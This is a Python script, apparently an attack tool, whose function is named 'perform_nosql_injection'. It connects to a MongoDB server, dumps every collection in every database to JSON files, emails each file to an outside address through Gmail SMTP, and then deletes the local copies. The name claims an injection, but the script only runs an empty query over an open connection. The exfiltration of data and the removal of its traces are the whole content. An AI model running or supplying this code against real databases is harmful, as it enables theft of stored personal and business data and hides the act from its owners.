import pymongo
import json
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from bson import ObjectId, Binary
from datetime import datetime

class CustomJSONEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, (ObjectId, Binary)):
            return str(o)
        elif isinstance(o, datetime):
            return o.isoformat()
        elif isinstance(o, bytes):
            try:
                return o.decode('utf-8')
            except UnicodeDecodeError:
                return o.decode('latin-1')
        return super().default(o)

def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {attachment_path}",
    )

    message.attach(part)
    text = message.as_string()

    server = None

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, text)
        print("Email sent successfully!")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if server:
            server.quit()

def perform_nosql_injection():
    client = pymongo.MongoClient("mongodb://localhost:27017")  # Replace with your MongoDB connection details

    databases = client.list_database_names()

    for db_name in databases:
        db = client[db_name]
        collections = db.list_collection_names()

        for collection_name in collections:
            collection = db[collection_name]
            query = {}

            result = collection.find(query)
            data = [document for document in result]

            if len(data) > 0:
                filename = f"{db_name}_{collection_name}.json"
                with open(filename, "w") as file:
                    json.dump(data, file, cls=CustomJSONEncoder)

                print(f"Data from {db_name}.{collection_name} stored in {filename}")

                # Send the JSON file via email
                sender_email = "<fake@mail.com>"  # Replace with your email address
                sender_password = "<FakePassword>"  # Replace with your email password
                receiver_email = "<getmail@mail.com>"  # Replace with the recipient's email address
                subject = "MongoDB Data"
                body = "Attached is the data extracted from MongoDB."
                attachment_path = filename

                send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path)
                print(f"Email sent with {filename}")

                # Delete the JSON file
                os.remove(filename)
                print(f"{filename} deleted successfully.")

            else:
                print(f"No data found in {db_name}.{collection_name}")

if __name__ == "__main__":
    perform_nosql_injection()
